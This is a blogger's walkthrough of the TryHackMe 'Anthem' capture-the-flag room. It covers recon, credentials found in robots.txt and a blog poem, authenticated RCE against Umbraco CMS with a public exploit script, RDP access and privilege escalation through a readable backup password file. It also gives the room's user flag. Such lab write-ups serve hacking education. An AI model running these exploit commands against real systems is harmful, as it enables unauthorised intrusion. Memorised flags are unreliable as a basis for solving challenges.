---
title: Anthem - TryHackMe
date: 2024-06-22
author: Habukhan
categories: [TryHackMe]
tags: [Hacking, CTFs, THM]
image: https://i.ibb.co/fqf0HnY/Copie-de-Manager-1.png
---

Anthem on TryHackMe is an easy Windows machine for beginners. Exploitation involves discovering passwords in web files, accessing an Umbraco CMS, using an RCE exploit to obtain a shell, and finding and using an administrator password for privilege escalation.

* [The Best Academy to Learn Hacking.](https://academy.hackthebox.com/?gspk=YWJkb3VsYXllZGlhbGxvODE2NQ&gspk=YWJkb3VsYXllZGlhbGxvODE2NQ&gsxid=64YiTlSvC64p&gsxid=lN1e33sf4tor&pscd=affiliate.hackthebox.com&pscd=affiliate.hackthebox.com&utm_campaign={affiliate}&utm_campaign={affiliate})
* [Beginner Friendly challenges on TryHackMe.](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1)

## Reconnaissance

With a quick scan of nmap, we found these 2 ports which are open
```bash
└─# /home/blo/tools/nmapautomate/nmapauto.sh $ip
Scanning 10.10.26.182 [65535 ports]
Discovered open port 3389/tcp on 10.10.26.182
Discovered open port 80/tcp on 10.10.26.182
```

* RDP open on 3389
* A website Available on port 80
In the website I find the file /robots.txtwhich contains a password UmbracoIsTheBest!, So now I have to find a user for this password

* In the Blog we find a poem with the following words:
```plaintext
Born on a Monday,
Christened on Tuesday,
Married on Wednesday,
Took ill on Thursday,
Grew worse on Friday,
Died on Saturday,
Buried on Sunday.
That was the end…       
```
I copy this text and I do a search on Google, then I find that the user who made the poem is called Solomon Grundywith reference to the email which is in the We are Hiring which is: JD@anthem.com, that is to say that it's the email of Jane Doe, so the same case here is to take the first letter of the user Solomon Grundyand it will be SG@anthem.comand to access with the password UmbracoIsTheBest!that I had already found.

## L’acces Initial
Ok, now I have administrator access to the CMS.
Whenever I find a CMS, I always start by checking Google for exploits

So by doing some research I found an [Exploit on Github ](https://github.com/noraj/Umbraco-RCE)

![Anthem - TryHackMe](https://i.ibb.co/9T90bDT/exploit.png)

The exploit works, so I'll list the files available with it powershelland the commandls
```bash
└─# python3 umbraco.py -u SG@anthem.com -p 'UmbracoIsTheBest!' -i http://10.10.74.33/ -c powershell.exe -a 'ls'


    Directory: C:\windows\system32\inetsrv


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       05/04/2020     21:51                Config                                                                
d-----       05/04/2020     21:51                de-DE                                                                 
d-----       05/04/2020     11:27                en                                                                    
d-----       05/04/2020     11:27                en-US                                                                 
d-----       05/04/2020     21:51                es-ES                                                                 
d-----       05/04/2020     21:51                fr-FR                                                                 
d-----       05/04/2020     21:51                it-IT                                                                 
d-----       05/04/2020     21:51                ja-JP                                                                 
d-----       05/04/2020     21:51                ko-KR                                                                 
d-----       05/04/2020     21:51                ru-RU                                                                 
d-----       05/04/2020     21:51                zh-CN                                                                 
d-----       05/04/2020     21:51                zh-TW                                                                 
-a----       05/04/2020     11:27         119808 appcmd.exe                                                            
-a----       15/09/2018     08:14           3810 appcmd.xml                                                            
-a----       05/04/2020     11:27         181760 AppHostNavigators.dll                                                 
-a----       05/04/2020     11:26          80896 apphostsvc.dll                                                        
-a----       05/04/2020     11:27         406016 appobj.dll                                                            
-a----       05/04/2020     11:26         131072 aspnetca.exe                                                          
-a----       05/04/2020     11:27          40448 authanon.dll                                                          
-a----       05/04/2020     11:26          24064 cachfile.dll                         
```
From here we can create a shell in .ps1, then put it on the machine and have a Shell. But also as the RDP is already open, then I will see which users are available

```bash
└─# xfreerdp /v:10.10.77.208 /u:SG /p:UmbracoIsTheBest! /sec:tls
[01:11:11:148] [31485:31486] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[01:11:11:148] [31485:31486] [WARN][com.freerdp.crypto] - CN = WIN-LU09299160F
[01:11:19:471] [31485:31486] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[01:11:19:472] [31485:31486] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
```
![Anthem - TryHackMe](https://i.ibb.co/FwwBvdk/a1.png)
I find the user flag in the OfficeTHM{NOOT_NOOT}

# Privilege Escalation
Now finished with the user, we must therefore elevate our privileges and be root on the Machine. In the room, I am given a hint about the admin password by saying it's hidden. So I will display all the cached files on the machine
![Anthem - TryHackMe](https://i.ibb.co/sRCWFsd/a2.png)
Coming back to my C:\I find a new Folder called backupand a file restore.
![Anthem - TryHackMe](https://i.ibb.co/GpPw2V4/a3.png)
I didn't have the necessary permissions to open this file, so I was able to modify it in the properties and then display the contents:
![Anthem - TryHackMe](https://i.ibb.co/2FwSswt/a4.png)
I use the administrator password to log in cmdand it works:
![Anthem - TryHackMe](https://i.ibb.co/g4D8Wqr/a5.png)

# Additional Resources

Here are some additional resources you might find helpful:

* [Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution](https://www.exploit-db.com/exploits/46153)
* [Nishang PowerShells](https://github.com/samratashok/nishang/tree/master/Shells)